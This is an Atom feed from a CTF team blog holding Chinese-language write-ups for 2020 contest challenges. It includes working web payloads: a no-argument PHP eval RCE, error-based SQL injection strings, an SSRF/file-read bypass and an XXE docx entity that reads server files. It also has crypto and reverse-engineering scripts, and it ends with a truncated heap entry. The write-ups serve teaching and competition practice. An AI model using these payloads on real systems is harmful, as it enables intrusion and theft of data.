<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BOI Team</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://boiteam.github.io/"/>
  <updated>2020-03-30T02:38:04.928Z</updated>
  <id>https://boiteam.github.io/</id>
  
  <author>
    <name>BOI Team</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” CRC32</title>
    <link href="https://boiteam.github.io/2020/03/29/CRC32/"/>
    <id>https://boiteam.github.io/2020/03/29/CRC32/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:38:04.928Z</updated>
    
    <content type="html"><![CDATA[<p>正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x5194c2d0</span>  <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="keyword">print</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    print(s)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;正常的通过CRC校验码爆破密码，打开压缩包发现每个密码文件都是四字节，改一改脚本依次爆破&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto_CRC32" scheme="https://boiteam.github.io/tags/Crypto-CRC32/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” RCE_NOPAR</title>
    <link href="https://boiteam.github.io/2020/03/29/RCE_NOPAR/"/>
    <id>https://boiteam.github.io/2020/03/29/RCE_NOPAR/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-29T08:17:16.976Z</updated>
    
    <content type="html"><![CDATA[<p>无字符GETSHELL就行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>]))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> (!preg_match(<span class="string">'/et|dir|na|info|dec|oct|pi|log/i'</span>, $_GET[<span class="string">'var'</span>])) &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">eval</span>($_GET[<span class="string">'var'</span>]);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>(<span class="string">"Sorry!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>payload：eval(hex2bin(session_id(session_start())))</p><p>改PHPSSEION值为16进制就行</p><p>system(‘cat /flag’);     -&gt;      73797374656d2827636174202f666c616727293b</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;无字符GETSHELL就行&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
    
    
      <category term="Web_无字符Getshell" scheme="https://boiteam.github.io/tags/Web-%E6%97%A0%E5%AD%97%E7%AC%A6Getshell/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” EasyRsa</title>
    <link href="https://boiteam.github.io/2020/03/29/EasyRsa/"/>
    <id>https://boiteam.github.io/2020/03/29/EasyRsa/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:50:49.846Z</updated>
    
    <content type="html"><![CDATA[<p>热身题，直接给了私钥，但是有一些迷惑性的信息</p><p><img src="/2020/03/29/EasyRsa/image-20200330100636601.png" alt="image-20200330100636601"></p><p>2两个1024bit，5个512bit，用俩大数模小数，得到的值是0的即为p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pmq <span class="keyword">import</span> *</span><br><span class="line">x1=int(<span class="string">'''00 E5 27 56 BF EB</span></span><br><span class="line"><span class="string">DA 06 F1 E7 C5 7C 4C 27  87 60 8F E7 1E C1 1F DE</span></span><br><span class="line"><span class="string">1B BF 7A 4A 0C A7 82 46  36 5D 03 AE 68 EB 87 97</span></span><br><span class="line"><span class="string">8A 33 61 DD 0F D9 F3 07  BF 35 52 CB 4D A7 83 B8</span></span><br><span class="line"><span class="string">3F 06 BF CE ED 62 7E 35  4C C7 41 AD A1 C8 F6 4C</span></span><br><span class="line"><span class="string">44 3F DD 01 44 F8 F2 C2  F4 C3 85 1F 1F 96 B8 89</span></span><br><span class="line"><span class="string">7D 04 B7 2A 1C 39 FC 34  2E B2 87 E9 D4 84 1D 30</span></span><br><span class="line"><span class="string">99 F6 45 96 DF 4A DF B1  84 B5 11 87 8B 3F 0C 4C</span></span><br><span class="line"><span class="string">94 2C A9 92 0F FB 7F 99  47 1E 05'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x3=int(<span class="string">'''00 F7 27  15 97 1B 35 84 F9 40 0D</span></span><br><span class="line"><span class="string">95 61 B9 62 D2 39 09 D9  8F 74 F5 38 4C AF C1 96</span></span><br><span class="line"><span class="string">79 38 20 8D B6 6A C8 04  9F 27 93 09 D3 7A 31 56</span></span><br><span class="line"><span class="string">74 27 A8 46 4D B4 CD D1  60 14 B6 08 0D 5F 72 F7</span></span><br><span class="line"><span class="string">75 60 F7 F7 97 47'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line">x4=int(<span class="string">'''00 ED 5B 4F 9E C8 14 02</span></span><br><span class="line"><span class="string">51 58 42 0D 73 34 07 89  B2 1E 85 C0 09 AA BD 04</span></span><br><span class="line"><span class="string">EE 4F 37 E1 EC 6C B7 8B  37 AF D7 30 42 4C 53 BA</span></span><br><span class="line"><span class="string">8C 16 75 14 EC 0E C9 7D  FD 77 C6 CD 09 6E 56 49</span></span><br><span class="line"><span class="string">55 4E 7B 68 5F E6 63 5E  53'''</span>.replace(<span class="string">' '</span>,<span class="string">''</span>).replace(<span class="string">'\n'</span>,<span class="string">''</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=x3</span><br><span class="line">q=x4</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=int(open(<span class="string">r'C:\Users\Administrator\Desktop\EasyRSA\flag.en'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(M(e,p,q,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'666c61677b57653163306d6543746633725f656c61627d0a'</span>.decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;热身题，直接给了私钥，但是有一些迷惑性的信息&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto_RSA算法原理" scheme="https://boiteam.github.io/tags/Crypto-RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” SQLI</title>
    <link href="https://boiteam.github.io/2020/03/29/SQLI/"/>
    <id>https://boiteam.github.io/2020/03/29/SQLI/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:10:27.908Z</updated>
    
    <content type="html"><![CDATA[<p>这个页面太丑了，三个功能，注册、登入、改密码，一般这种涉及多次数据库操作的基本都是二次注入。测试用户名处</p><blockquote><p>注册用户：ccc”</p><p>密码：ccc</p></blockquote><p>改密码的时候报错了</p><p><img src="/2020/03/29/SQLI/image-20200327151345433.png" alt="image-20200327151345433"></p><p>多测试测试，过来了空格、/*、and……直接报错注入最方便了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ccc"||updatexml(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema=<span class="keyword">database</span>())),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">ccc<span class="string">"||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)&amp;(table_schema=database())),0x7e),1)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ccc"</span>||updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flag)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个页面太丑了，三个功能，注册、登入、改密码，一般这种涉及多次数据库操作的基本都是二次注入。测试用户名处&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
    
    
      <category term="Web_二次注入" scheme="https://boiteam.github.io/tags/Web-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” re1</title>
    <link href="https://boiteam.github.io/2020/03/29/Re1/"/>
    <id>https://boiteam.github.io/2020/03/29/Re1/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-29T08:07:58.080Z</updated>
    
    <content type="html"><![CDATA[<p>签到题，先运行下程序，发现有文字提示“输入flag”。<br>用IDA打开程序，搜索字符flag，找到程序关键函数sub_140001070()。<br>找到判断逻辑，读取输入直接与flag对比。直接将代码if判断条件中的字符串提取出即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;签到题，先运行下程序，发现有文字提示“输入flag”。&lt;br&gt;用IDA打开程序，搜索字符flag，找到程序关键函数sub_140001070()。&lt;br&gt;找到判断逻辑，读取输入直接与flag对比。直接将代码if判断条件中的字符串提取出即可。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” SSRF</title>
    <link href="https://boiteam.github.io/2020/03/29/SSRF/"/>
    <id>https://boiteam.github.io/2020/03/29/SSRF/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-29T08:18:20.765Z</updated>
    
    <content type="html"><![CDATA[<p>把file后面的参数两层base64解开，就知道可以包含其他文件，两层base64编码就行</p><p>第一层读index.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span></span><br><span class="line"></span><br><span class="line"><span class="php">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span></span><br><span class="line"><span class="php">    header(<span class="string">'Refresh:0;url=./index.php?file=WTNSbWFXMWhaMlV1YW5Cbg=='</span>);</span></span><br><span class="line"><span class="php">$file = base64_decode(base64_decode($_GET[<span class="string">'file'</span>]));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'file'</span>].<span class="string">'&lt;/title&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'input_filename:   '</span>. $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = str_replace(<span class="string">"ctf"</span>,<span class="string">"flag"</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'real_filename:   '</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$txt = base64_encode(file_get_contents($file));</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> * Hint: hal0flagi5here.php</span><br><span class="line"><span class="php"> */</span></span><br></pre></td></tr></table></figure><p>继续读hal0flagi5here.php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$argv[<span class="number">1</span>]=$_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>],FILTER_VALIDATE_URL))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$r = parse_url($argv[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">print_r($r);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(preg_match(<span class="string">'/happyctf\.com$/'</span>,$r[<span class="string">'host'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">$url=file_get_contents($argv[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($url);</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>(<span class="string">"error"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"403 Forbidden"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里卡了我很久，用data://happyctf.com/plain,base64,xxxxx只能构造返回体，不能任意读文件。</p><p>通过测试，file_get_contents()种如果是不规范的协议，则进行本地文件包含，构造</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="regexp">//</span>happyctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag.txt</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;把file后面的参数两层base64解开，就知道可以包含其他文件，两层base64编码就行&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
    
    
      <category term="Web_SSRF" scheme="https://boiteam.github.io/tags/Web-SSRF/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” angr2_2</title>
    <link href="https://boiteam.github.io/2020/03/29/angr2_2%20wp/"/>
    <id>https://boiteam.github.io/2020/03/29/angr2_2%20wp/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:39:00.967Z</updated>
    
    <content type="html"><![CDATA[<p>没有任何保护，IDA打开定位main函数，一键F5。<br>对main进行分析，找到程序逻辑：输入一字符加密判断是否等于”ZCPTMWEHULCABSBD“。<br>找到加密的算法，对算法进行逆向。得到关键信息，输入的字符串都为小写字母。<br>用脚本对加密后的字符串”ZCPTMWEHULCABSBD“进行逆运算，结合限制条件小写字母得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//python脚本</span><br><span class="line">s=[<span class="string">'Z'</span>,<span class="string">'C'</span>,<span class="string">'P'</span>,<span class="string">'T'</span>,<span class="string">'M'</span>,<span class="string">'W'</span>,<span class="string">'E'</span>,<span class="string">'H'</span>,<span class="string">'V'</span>,<span class="string">'L'</span>,<span class="string">'C'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'S'</span>,<span class="string">'B'</span>,<span class="string">'D'</span>]</span><br><span class="line">v3=<span class="number">0</span></span><br><span class="line">v5=len(s)</span><br><span class="line">l=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,v5):</span><br><span class="line">a=<span class="number">18</span>-i</span><br><span class="line">c=ord(s[i])<span class="number">-29</span>*a</span><br><span class="line">        <span class="keyword">while</span>((c&lt;=<span class="number">64</span>)|(c&gt;<span class="number">90</span>)):</span><br><span class="line">c+=<span class="number">26</span></span><br><span class="line">k+=chr(c)</span><br><span class="line">print(k)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没有任何保护，IDA打开定位main函数，一键F5。&lt;br&gt;对main进行分析，找到程序逻辑：输入一字符加密判断是否等于”ZCPTMWEHULCABSBD“。&lt;br&gt;找到加密的算法，对算法进行逆向。得到关键信息，输入的字符串都为小写字母。&lt;br&gt;用脚本对加密后的字符串”ZCPTMWEHULCABSBD“进行逆运算，结合限制条件小写字母得到flag。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_算法求解" scheme="https://boiteam.github.io/tags/Re-%E7%AE%97%E6%B3%95%E6%B1%82%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” XXE</title>
    <link href="https://boiteam.github.io/2020/03/29/XXE/"/>
    <id>https://boiteam.github.io/2020/03/29/XXE/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:11:25.430Z</updated>
    
    <content type="html"><![CDATA[<p>下载模板docx文件，后缀改为zip，直接在zip下修改docProps/core.xml文件内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"/var/www/secret"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">cp:coreProperties</span> <span class="attr">xmlns:cp</span>=<span class="string">"http://schemas.openxmlformats.org/package/2006/metadata/core-properties"</span> <span class="attr">xmlns:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span> <span class="attr">xmlns:dcterms</span>=<span class="string">"http://purl.org/dc/terms/"</span> <span class="attr">xmlns:dcmitype</span>=<span class="string">"http://purl.org/dc/dcmitype/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">dc:title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:subject</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:subject</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:creator</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:creator</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:keywords</span>&gt;</span><span class="tag">&lt;/<span class="name">cp:keywords</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dc:description</span>&gt;</span><span class="tag">&lt;/<span class="name">dc:description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:lastModifiedBy</span>&gt;</span><span class="tag">&lt;/<span class="name">cp:lastModifiedBy</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cp:revision</span>&gt;</span>1<span class="tag">&lt;/<span class="name">cp:revision</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dcterms:created</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:00:00Z<span class="tag">&lt;/<span class="name">dcterms:created</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dcterms:modified</span> <span class="attr">xsi:type</span>=<span class="string">"dcterms:W3CDTF"</span>&gt;</span>2015-08-01T19:01:00Z<span class="tag">&lt;/<span class="name">dcterms:modified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">cp:coreProperties</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改回docx格式上传即可触发XXE漏洞</p><p><img src="/2020/03/29/XXE/image-20200327152415694.png" alt="image-20200327152415694"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;下载模板docx文件，后缀改为zip，直接在zip下修改docProps/core.xml文件内容为&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="php" scheme="https://boiteam.github.io/categories/Web/php/"/>
    
    
      <category term="Web_XXE" scheme="https://boiteam.github.io/tags/Web-XXE/"/>
    
  </entry>
  
  <entry>
    <title>2020 易林博“停课不停赛，以赛促学” vm</title>
    <link href="https://boiteam.github.io/2020/03/29/vm/"/>
    <id>https://boiteam.github.io/2020/03/29/vm/</id>
    <published>2020-03-28T16:00:00.000Z</published>
    <updated>2020-03-30T02:40:22.209Z</updated>
    
    <content type="html"><![CDATA[<p>这是一个C语言虚拟机题，而且也没开地址随机化，于是直接想到angr自动化解题<br><strong>第一层考点：angr框架使用</strong></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">proj = angr.Project(<span class="string">"./vm"</span>)</span><br><span class="line"><span class="keyword">state</span> = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(<span class="keyword">state</span>)</span><br><span class="line">simgr.explore(find=<span class="number">0</span>x4009BC,avoid=<span class="number">0</span>x4008C7)</span><br><span class="line">print (simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>​                                </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一个C语言虚拟机题，而且也没开地址随机化，于是直接想到angr自动化解题&lt;br&gt;&lt;strong&gt;第一层考点：angr框架使用&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Re" scheme="https://boiteam.github.io/categories/Re/"/>
    
    
      <category term="Re_angr的使用" scheme="https://boiteam.github.io/tags/Re-angr%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF easy_heap</title>
    <link href="https://boiteam.github.io/2020/03/21/2020_GXZYCTF_easy_heap/"/>
    <id>https://boiteam.github.io/2020/03/21/2020_GXZYCTF_easy_heap/</id>
    <published>2020-03-21T01:52:20.000Z</published>
    <updated>2020-03-22T04:04:02.726Z</updated>
    
    <content type="html"><![CDATA[<p>add功能里如果size不符合要求，不会退出程序，这时，堆不会进行初始化，但是，指针却可以使用，进而造成问题。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 